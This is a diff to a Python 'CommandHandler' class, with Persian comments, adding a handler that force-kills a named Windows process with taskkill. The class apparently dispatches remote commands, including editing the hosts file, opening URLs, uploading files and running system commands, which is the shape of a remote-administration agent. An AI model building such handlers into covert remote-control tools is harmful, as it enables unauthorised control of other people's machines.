@@ -23,7 +23,8 @@ class CommandHandler:
             'process_management': CommandHandler.handle_process_management,
             'edit_hosts': CommandHandler.handle_edit_hosts,
             'open_url': CommandHandler.handle_open_url,
-            'upload_file': CommandHandler.handle_upload_file
+            'upload_file': CommandHandler.handle_upload_file,
+            'end_task': CommandHandler.handle_end_task  # اضافه شده
         }
         
         handler = handlers.get(command_type)
@@ -32,6 +33,45 @@ class CommandHandler:
             raise CommandError(f"Unknown command type: {command_type}")
         
         return handler(params)
+
+    @staticmethod
+    def handle_end_task(params):
+        process_name = params.get('process_name')
+        if not process_name:
+            logging.error("No process name provided")
+            raise CommandError("No process name provided")
+        
+        try:
+            # اجرای taskkill برای بستن پروسه
+            result = subprocess.run(
+                ['taskkill', '/IM', process_name, '/F'],
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            logging.info(f"Task {process_name} terminated: {result.stdout}")
+            return {
+                'status': 'success',
+                'message': f"Task {process_name} terminated",
+                'stdout': result.stdout,
+                'stderr': result.stderr,
+                'returncode': result.returncode
+            }
+        except subprocess.TimeoutExpired:
+            logging.error(f"Taskkill timed out for {process_name}")
+            raise CommandError(f"Taskkill timed out for {process_name}")
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Failed to terminate task {process_name}: {e.stderr}")
+            return {
+                'status': 'failed',
+                'message': f"Failed to terminate task {process_name}",
+                'stdout': e.stdout,
+                'stderr': e.stderr,
+                'returncode': e.returncode
+            }
+        except Exception as e:
+            logging.error(f"Error terminating task {process_name}: {str(e)}")
+            raise CommandError(f"Error terminating task {process_name}: {str(e)}")
 
     @staticmethod
     def handle_system_command(params):
